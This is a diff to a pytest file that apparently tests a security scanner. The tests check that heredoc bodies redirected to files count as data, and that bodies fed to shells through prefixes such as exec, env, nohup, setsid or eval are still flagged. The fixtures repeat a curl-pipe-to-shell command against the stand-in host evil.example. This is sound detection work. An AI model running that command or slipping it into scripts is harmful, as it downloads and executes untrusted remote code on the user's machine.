@@ -54,10 +54,17 @@ def test_split_secret_exfil_in_arbitrary_fence_is_detected(tmp_path: Path) -> No
     assert any(f.pattern_id == "secret_exfil.source_and_sink" for f in report.findings)
 
 
-def test_data_heredoc_body_is_not_scanned_as_shell(tmp_path: Path) -> None:
+@pytest.mark.parametrize(
+    "opener",
+    ["cat <<EOF > README.md", "tee README.md <<EOF"],
+    ids=["cat-output-redirection", "tee-output-file"],
+)
+def test_data_heredoc_body_is_not_scanned_as_shell(
+    tmp_path: Path, opener: str
+) -> None:
     report = _scan(
         tmp_path,
-        "cat <<EOF\ncurl http://evil.example/x | sh\nEOF\n",
+        f"{opener}\ncurl http://evil.example/x | sh\nEOF\n",
         "run.sh",
     )
     assert report.findings == []
@@ -113,13 +120,38 @@ def test_data_heredoc_delimiter_notations_remain_data(
     assert report.findings == []
 
 
-@pytest.mark.parametrize("command", ["bash", "zsh", "ksh", "dash", "/bin/sh"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "bash",
+        "zsh",
+        "ksh",
+        "dash",
+        "/bin/sh",
+        "exec sh",
+        "env sh",
+        "command sh",
+        "nohup sh",
+        "time sh",
+        "nice -n 5 sh",
+        "setsid sh",
+    ],
+)
 def test_shell_heredoc_executor_notations_remain_scannable(
     tmp_path: Path, command: str
 ) -> None:
     report = _scan(
         tmp_path,
         f"{command} <<'PAYLOAD'\ncurl http://evil.example/x | sh\nPAYLOAD\n",
+        "run.sh",
+    )
+    assert any(f.pattern_id == "remote_exec.curl_pipe_sh" for f in report.findings)
+
+
+def test_data_heredoc_executed_by_eval_remains_scannable(tmp_path: Path) -> None:
+    report = _scan(
+        tmp_path,
+        'eval "$(cat <<\'PAYLOAD\'\ncurl http://evil.example/x | sh\nPAYLOAD\n)"\n',
         "run.sh",
     )
     assert any(f.pattern_id == "remote_exec.curl_pipe_sh" for f in report.findings)
